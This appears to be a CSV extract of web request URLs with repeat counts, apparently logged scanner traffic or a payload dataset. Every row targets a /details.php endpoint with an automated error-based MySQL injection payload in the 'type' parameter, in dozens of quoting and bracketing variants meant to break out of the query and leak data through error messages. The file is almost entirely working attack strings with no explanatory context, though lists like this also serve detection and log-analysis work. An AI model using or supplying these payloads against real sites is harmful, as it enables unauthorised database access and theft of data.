full_url,repeat_count
/details.php?prod=5&type=2%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20SgQy,1213
/details.php?prod=5&type=2%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%23%20HJsD,1214
/details.php?prod=5&type=2%29%20WHERE%205403%3D5403%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20LVKy,1215
/details.php?prod=5&type=2%20WHERE%201501%3D1501%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20gwbE,1216
/details.php?prod=5&type=2%2B%28SELECT%20Pxkl%20WHERE%202401%3D2401%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%29%2B,1217
/details.php?prod=5&type=2%29%29%20AS%20ekVS%20WHERE%204099%3D4099%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20fNBa,1218
/details.php?prod=5&type=2%29%20AS%20YWeA%20WHERE%203769%3D3769%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20HOyE,1219
/details.php?prod=5&type=2%60%20WHERE%203176%3D3176%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20VyGF,1220
/details.php?prod=5&type=2%60%29%20WHERE%207605%3D7605%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20hNpS,1221
/details.php?prod=5&type=2%60%3D%602%60%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%602%60%3D%602,1222
/details.php?prod=5&type=2%5D-%28SELECT%200%20WHERE%201282%3D1282%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%29%7C%5B2,1223
/details.php?prod=5&type=2%27%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20jaLX,1224
/details.php?prod=5&type=2%27%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20jsiE,1225
/details.php?prod=5&type=2%22%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20Vnhq,1226
/details.php?prod=5&type=2%27%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%27vsXQ%27%3D%27vsXQ,1227
/details.php?prod=5&type=2%27%29%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%28%27wQbc%27%3D%27wQbc,1228
/details.php?prod=5&type=2%27%29%29%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%28%28%27fvuQ%27%3D%27fvuQ,1229
/details.php?prod=5&type=2%27%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%27wyWT%27%3D%27wyWT,1230
/details.php?prod=5&type=2%27%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%27BOWa%27%20LIKE%20%27BOWa,1231
/details.php?prod=5&type=2%27%29%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%28%27FqPU%27%20LIKE%20%27FqPU,1232
/details.php?prod=5&type=2%27%29%29%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%28%28%27UAIv%27%20LIKE%20%27UAIv,1233
/details.php?prod=5&type=2%25%27%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%27Saui%25%27%3D%27Saui,1234
/details.php?prod=5&type=2%27%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%27Igmo%27%20LIKE%20%27Igmo,1235
/details.php?prod=5&type=2%22%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%22LbfB%22%3D%22LbfB,1236
/details.php?prod=5&type=2%22%29%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%28%22huea%22%3D%22huea,1237
/details.php?prod=5&type=2%22%29%29%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%28%28%22uISU%22%3D%22uISU,1238
/details.php?prod=5&type=2%22%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%22yXuP%22%3D%22yXuP,1239
/details.php?prod=5&type=2%22%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%22DPPH%22%20LIKE%20%22DPPH,1240
/details.php?prod=5&type=2%22%29%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%28%22PLsN%22%20LIKE%20%22PLsN,1241
/details.php?prod=5&type=2%22%29%29%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%28%28%22MEoS%22%20LIKE%20%22MEoS,1242
/details.php?prod=5&type=2%22%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%22tXOB%22%20LIKE%20%22tXOB,1243
/details.php?prod=5&type=2%27%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20OR%20%27stTv%27%3D%27CZOk,1244
/details.php?prod=5&type=2%27%29%20WHERE%209058%3D9058%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20sRvj,1245
/details.php?prod=5&type=2%22%29%20WHERE%207757%3D7757%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20wBpO,1246
/details.php?prod=5&type=2%27%20WHERE%203575%3D3575%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20tDsy,1247
/details.php?prod=5&type=2%22%20WHERE%201403%3D1403%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20atMA,1248
/details.php?prod=5&type=2%27%7C%7C%28SELECT%200x484d7175%20WHERE%205553%3D5553%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%29%7C%7C%27,1249
/details.php?prod=5&type=2%27%7C%7C%28SELECT%200x4a765647%20FROM%20DUAL%20WHERE%206501%3D6501%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%29%7C%7C%27,1250
/details.php?prod=5&type=2%27%2B%28SELECT%200x47584670%20WHERE%208902%3D8902%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%29%2B%27,1251
/details.php?prod=5&type=2%7C%7C%28SELECT%200x62737551%20FROM%20DUAL%20WHERE%204553%3D4553%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%29%7C%7C,1252
/details.php?prod=5&type=2%7C%7C%28SELECT%200x796a6b66%20WHERE%208524%3D8524%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%29%7C%7C,1253
/details.php?prod=5&type=2%2B%28SELECT%200x6b714f71%20WHERE%204405%3D4405%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%29%2B,1254
/details.php?prod=5&type=2%27%29%29%20AS%20kRkE%20WHERE%201331%3D1331%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20dKOD,1255
/details.php?prod=5&type=2%22%29%29%20AS%20NKXh%20WHERE%205762%3D5762%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20CPYV,1256
/details.php?prod=5&type=2%27%29%20AS%20mtmw%20WHERE%204801%3D4801%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20unHO,1257
/details.php?prod=5&type=2%22%29%20AS%20NqeL%20WHERE%201374%3D1374%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29--%20DCYy,1258
/details.php?prod=5&type=2%22%3D%222%22%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%20AND%20%222%22%3D%222,1259
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281338%3D1338%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%23,1260
/details.php?prod=5&type=2%29%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20ilol,1261
/details.php?prod=5&type=2%29%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%287434%3D7434,1262
/details.php?prod=5&type=2%29%29%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%289214%3D9214,1263
/details.php?prod=5&type=2%29%29%29%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%28%285738%3D5738,1264
/details.php?prod=5&type=2%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29,1265
/details.php?prod=5&type=2%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20XoCc,1266
/details.php?prod=5&type=2%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%23%20gMYx,1267
/details.php?prod=5&type=2%29%20WHERE%209417%3D9417%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20trCz,1268
/details.php?prod=5&type=2%20WHERE%207327%3D7327%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20uSLY,1269
/details.php?prod=5&type=2%2B%28SELECT%20oVGF%20WHERE%206959%3D6959%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%29%2B,1270
/details.php?prod=5&type=2%29%29%20AS%20qgbS%20WHERE%204664%3D4664%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20efpq,1271
/details.php?prod=5&type=2%29%20AS%20pNkS%20WHERE%209979%3D9979%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20MBmS,1272
/details.php?prod=5&type=2%60%20WHERE%201021%3D1021%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20QODt,1273
/details.php?prod=5&type=2%60%29%20WHERE%206365%3D6365%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20AVlT,1274
/details.php?prod=5&type=2%60%3D%602%60%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%602%60%3D%602,1275
/details.php?prod=5&type=2%5D-%28SELECT%200%20WHERE%207687%3D7687%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%29%7C%5B2,1276
/details.php?prod=5&type=2%27%29%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20tqnj,1277
/details.php?prod=5&type=2%27%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20lfdr,1278
/details.php?prod=5&type=2%22%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20pCFT,1279
/details.php?prod=5&type=2%27%29%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%27ryLN%27%3D%27ryLN,1280
/details.php?prod=5&type=2%27%29%29%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%28%27FrCX%27%3D%27FrCX,1281
/details.php?prod=5&type=2%27%29%29%29%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%28%28%27tUmg%27%3D%27tUmg,1282
/details.php?prod=5&type=2%27%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%27Jrks%27%3D%27Jrks,1283
/details.php?prod=5&type=2%27%29%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%27vPuX%27%20LIKE%20%27vPuX,1284
/details.php?prod=5&type=2%27%29%29%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%28%27TGVi%27%20LIKE%20%27TGVi,1285
/details.php?prod=5&type=2%27%29%29%29%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%28%28%27xESv%27%20LIKE%20%27xESv,1286
/details.php?prod=5&type=2%25%27%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%27hjdO%25%27%3D%27hjdO,1287
/details.php?prod=5&type=2%27%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%27oKoK%27%20LIKE%20%27oKoK,1288
/details.php?prod=5&type=2%22%29%20AND%20%28SELECT%201436%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281436%3D1436%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%22dosn%22%3D%22dosn,1289
